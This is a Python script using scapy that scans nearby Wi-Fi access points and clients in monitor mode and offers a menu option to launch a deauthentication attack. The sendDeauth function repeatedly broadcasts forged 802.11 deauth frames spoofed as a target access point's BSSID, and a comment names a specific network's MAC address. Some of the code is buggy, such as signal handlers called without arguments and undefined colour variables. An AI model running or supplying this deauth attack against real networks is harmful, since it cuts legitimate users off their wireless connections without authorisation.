from scapy.all import *
from WifiClass import *
from Client import *
from time import sleep
from prettytable import PrettyTable
from subprocess import Popen, PIPE,check_output
from threading import Lock
global APtable,CLtable,WifiList,ClientsList
global APs,ClientsList
Channels=[1,2,3,4,5,6,7,8,9,10,11]
INTERFACE = ""

ignoreMac = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:']
'''
channelSwitcher() is for hop/jump between channels [1,11]
'''
def channelSwitcher(interface):
    Channel = 1
    with lock:
        try:
            jmp = 0
            while True:
                try:
                    time.sleep(0.5)
                    os.system('iwconfig %s channel %d' % (INTERFACE, Channel))
                    curr = Channels[jmp % 11]
                    jmp += 1
                    if curr != Channel:
                        Channel = curr
                except KeyboardInterrupt:
                    signalHandler()
        except KeyboardInterrupt:
            signalHandler()

'''
Deauth() calls sendDeauth for acuatly send the "Deauth Packets"
Deauth() is just request the MAC address of the AP the attack.
'''
def Deauth():
    try:
        print("\n\n[+]Enter MAC:\n")
        BSSID = raw_input("[+]Example: FF:FF:FF:FF:FF:FF 10\n")
        sendDeauth(BSSID)
    except KeyboardInterrupt:
        signalHandler()
'''
SendDeauth() sending the packet, RadioTap over Dot11(which is 802.11) over Dot11Deuath
addr1 = is for broudcast
addr2 = addr3 = is the attack AP
'''
def sendDeauth(BSSID):
    conf.iface = INTERFACE
    packet = RadioTap()/Dot11(type=0,subtype=12,addr1="FF:FF:FF:FF:FF:FF",addr2=BSSID,addr3=BSSID)/Dot11Deauth()
    i=1
    try:
        while True:
            #14:AE:DB:B7:D1:8D-Torgeman BSSID
            sleep(0.1)
            os.system("clear")
            sendp(packet,verbose=False)
            #print(,end="",flush=True)
            sys.stdout.write("Sent "+str(i)+" Packets to "+BSSID)
            sys.stdout.flush()
            i+=1

    except KeyboardInterrupt:
        signalHandler()

def findSSID(pkt):
    global ClientsList
    ClientsList = []
    try:
        if pkt.haslayer(Dot11Beacon):
            if pkt.getlayer(Dot11).addr2:
                tmpWifi = Wifi(pkt)
                if(tmpWifi not in WifiList):
                    WifiList.append(tmpWifi)
                elif(tmpWifi in WifiList):
                    for w in WifiList:
                        if(tmpWifi.getBSSID() == w.getBSSID()):
                            if(tmpWifi.getRSSI() != w.getRSSI()):
                                w.setRSSI(tmpWifi.getRSSI())
                                return
        #elif pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type == 2L and not pkt.haslayer(EAPOL):
        elif (pkt.haslayer(Dot11) and pkt.subtype in [0,1,2,4]) or (pkt.getlayer(Dot11).type == 2L  and not pkt.haslayer(EAPOL)):
            #print(pkt.getlayer(Dot11).addr2)
            #print(pkt.getlayer(Dot11).addr1)
            # This means it's data frame.
            sender = pkt.getlayer(Dot11).addr2.upper()
            reciver = pkt.getlayer(Dot11).addr1.upper()

            if (reciver.lower() not in ignoreMac and sender.lower() not in ignoreMac):
                for w in WifiList:
                    if(w.getBSSID().upper() == reciver and w.getBSSID().upper() != sender):
                            tmpClient = Client(w.getBSSID(),sender)
                            if(tmpClient not in w.getClients()):
                                w.getClients().append(tmpClient)
                                #w.getClients().append(sender)
                    if(w.getBSSID().upper() != reciver and w.getBSSID().upper() == sender):
                            tmpClient = Client(w.getBSSID(),reciver)
                            if(tmpClient not in w.getClients()):
                                w.getClients().append(tmpClient)
                if(sender in  ClientsList):
                    ClientsList.remove(sender)
                if(reciver in ClientsList):
                    ClientsList.remove(reciver)
                        #w.getClients().append(reciver)
            else:
                if(sender.lower() not in ignoreMac and sender not in ClientsList):
                    ClientsList.append(sender)
                elif reciver.lower() not in ignoreMac and reciver not in ClientsList:
                    ClientsList.append(reciver)
    except KeyboardInterrupt:
        signalHandler()
'''
Printer() is for print the data that collect.
going through WifiList and print each Wifi object.
same thing for Clients.
'''
def Printer():
    global ClientsList
    ClientsList = []
    try:
        os.system("clear")
        os.system("cat art.txt")
        APtable.clear_rows()
        CLtable.clear_rows()
        for w in WifiList:
            APtable.add_row([w.getSSID(),w.getBSSID(),w.getRSSI(),w.getChannel(),w.getNumOfClients(),w.getVendor()])
            for c in w.getClients():
                CLtable.add_row([w.getBSSID(),c.getBSSID(),c.getVendor()])
        for c in ClientsList:
                CLtable.add_row(["Not associate",c,"N/A"])
        print(APtable.get_string(sortby="BSSID"))
        print(10*"-" + "Clients" + 10*"-")
        print(CLtable.get_string(sortby="AP"))

    except KeyboardInterrupt:
        signalHandler()

def spinning_cursor():
    for i in range(0,10):
        for cursor in '\\|/-':
            time.sleep(0.1)
              # Use '\r' to move cursor back to line beginning
              # Or use '\b' to erase the last character
            sys.stdout.write('\r{}'.format(cursor))
              # Force Python to write data into terminal.
            sys.stdout.flush()
'''
Define Tables is for tabls printing, define that headers of the table.
'''
def DefineTables():
    global APtable,CLtable,WifiList
    APtable = PrettyTable()
    CLtable = PrettyTable()
    APtable.field_names=["SSID","BSSID","RSSI","Channel","Clients","Vendor"]
    CLtable.field_names=["AP","Client Mac","Vendor"]
    WifiList=[]
'''
Create threads to hop between channel and than each thread find AP and clients.
'''
def Scan():
    global INTERFACE
    try:
        with lock:
            thread = threading.Thread(target=channelSwitcher, args=(str(INTERFACE), ), name="channelSwitcher")
            thread.daemon = True
            thread.start()
        while True:
            Printer()
            sniff(iface=""+str(INTERFACE),prn=findSSID,count=1)
            #spinning_cursor()
    except KeyboardInterrupt:
        signalHandler()
'''
main() if the main window , just for UI.
'''
def main():
    try:
        #os.system("clear")
        os.system("cat art.txt")
        choice = input("\n\n[1]Start scanning \n[2]Start deauthentication\n[3]Exit \n")
        if(choice == 1):
            MonitorMode()
            Scan()
        elif(choice == 2):
            Deauth()
        else:
            print("Quitting. . . ")
            sys.exit(1)
    except KeyboardInterrupt:
        signalHandler()
    finally:
        os.system("ifconfig "+str(INTERFACE)+" down && iwconfig "+str(INTERFACE)+" mode managed && ifconfig "+str(INTERFACE)+" up")
'''
MonitorMode() is for enter the network adapter to monitor mode.
'''
def MonitorMode():
    try:

        print("Enter %s to monitor mode...\n") % INTERFACE
        sleep(0.5)
        test = subprocess.check_output("iwconfig", stderr=subprocess.STDOUT)
        proc0 = subprocess.call("ifconfig "+str(INTERFACE)+" down",shell=True)
        sleep(0.5)
        proc1 = subprocess.call("iwconfig "+str(INTERFACE)+" mode monitor",shell=True)
        sleep(0.5)
        proc2 = subprocess.call("ifconfig "+str(INTERFACE)+" up",shell=True)
        #os.system("ifconfig wlan0 down && iwconfig wlan0 mode monitor && ifconfig wlan0 up")
        sleep(0.5)
    except Exception as e:
        print("Cannot switch to monitor mode, quitting. . . ",e)
        sleep(1)
        exit(1)

def signalHandler(signum, frame):
    main()

if __name__ == "__main__":
    signal.signal(signal.SIGTERM, signalHandler)
    signal.signal(signal.SIGINT, signalHandler)
    try:
        if os.geteuid():
            sys.exit('['+R+'-'+W+'] Please run as root')
        lock = Lock()
        DefineTables()
        os.system("cat art.txt")
        os.system("clear")
        INTERFACE = raw_input("Enter interface name:")
        main()
    except KeyboardInterrupt:
        signalHandler()
